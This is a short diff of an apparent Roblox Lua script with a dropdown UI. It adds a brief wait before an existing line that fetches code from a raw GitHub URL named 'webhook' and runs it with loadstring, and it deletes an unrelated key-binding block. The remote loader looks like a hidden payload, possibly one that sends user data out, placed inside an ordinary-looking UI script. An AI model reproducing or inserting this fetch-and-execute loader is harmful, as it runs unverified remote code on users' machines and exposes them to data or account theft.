@@ -1952,7 +1952,7 @@ Tab:dropdown({
     end,
 })
 
-
+wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook"))()
 
 
@@ -1961,15 +1961,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilov
 
 
 
-local ContextActionService = experience:GetService("ContextActionService")
-
-local function handleAction(actionName, inputState, inputObject)
-	if inputState == Enum.UserInputState.Begin then
-		print(actionName, inputObject)
-	end
-end
-
--- Bind action to function
-ContextActionService:BindAction("Interact", handleAction, true, Enum.KeyCode.LeftAlt)
 
 
